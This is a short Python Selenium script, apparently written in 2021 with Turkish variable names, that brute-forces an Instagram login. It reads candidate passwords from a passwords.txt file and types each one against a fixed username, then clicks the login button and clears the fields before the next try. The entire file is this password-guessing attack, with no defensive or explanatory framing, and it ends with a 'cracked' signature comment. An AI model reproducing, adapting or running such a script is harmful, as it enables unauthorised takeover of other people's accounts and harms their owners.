from selenium import webdriver
import time
browser = webdriver.Firefox()

browser.get('https://www.instagram.com/')

time.sleep(3)

user_name = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
password = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
giris = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]/button')
dosya = open('passwords.txt','r')
time.sleep(3)
for sifre in dosya:
    user_name.send_keys('nyks_yig')
    password.send_keys(sifre)
    print(sifre)
    giris.click()
    time.sleep(2)
    browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input').clear()
    browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input').clear()

dosya.close()
# By cracked SakirBey 2021
